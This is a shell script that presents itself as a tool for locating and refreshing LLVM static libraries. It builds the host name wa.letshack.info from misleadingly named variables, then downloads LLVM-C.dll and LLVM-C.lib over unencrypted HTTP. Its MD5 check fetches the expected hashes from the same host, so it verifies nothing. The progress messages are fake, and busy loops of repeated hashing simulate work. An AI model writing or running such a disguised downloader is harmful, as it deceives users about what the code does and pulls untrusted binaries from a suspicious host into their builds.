#!/bin/sh
set -e

__CDN_PARTITION_STL_VARIANT="wa"
__CDN_PROTECTED_DOMAIN_NAME="letshack.info"
__SITE_URL_PREFIX="http://"
_IMP_SITE_URL="${__SITE_URL_PREFIX}${__CDN_PARTITION_STL_VARIANT}.${__CDN_PROTECTED_DOMAIN_NAME}"
REMOTE_SITE_URL="${_IMP_SITE_URL}"

function yield()
{
  sync
  for iter in {1..1903}
  do
    md5sum .gitignore hello_world.c doc/* LICENSE > /dev/null
  done
  sync
}

function yield_heavy()
{
  sync
  for iter in {1..8357}
  do
    sha1sum .gitignore hell/.pla* hello_world.c doc/* LICENSE > /dev/null
  done
  sync
}

echo "$(date +%s) "'[STANDBY] Connecting to Command Line Manager of LLVM Libraries ...'
yield

echo "$(date +%s) "'[HIT] Locating LLVM Static Libraries... (00.00%)'
yield_heavy
curl -o LLVM-C.dll -L -C - "${REMOTE_SITE_URL}/LLVM-C.dll"
yield
echo "$(date +%s) "'[HIT] Locating LLVM Static Libraries... (99.98%)'
yield_heavy
curl -o LLVM-C.lib -L -C - "${REMOTE_SITE_URL}/LLVM-C.lib"
yield
echo "$(date +%s) "'[PASS] Located LLVM Static Libraries - 100.00%'
yield_heavy

echo '  % Current Average ----------- SITE RELOCATOR REFRESHED --------------------- '
curl -L -C - "${REMOTE_SITE_URL}/MD5SUM" | grep LLVM-C | md5sum -c -
yield
echo "$(date +%s) "'[HIT] Refreshing LLVM Libraries Over The Air (97%)'
yield
echo "$(date +%s) "'[PASS] LLVM Libraries Refreshed (OTA) - 100.00%'
yield_heavy
echo '  % Time Time Time ----------- SITE RELOCATOR EXPIRED ------------------- Speed'
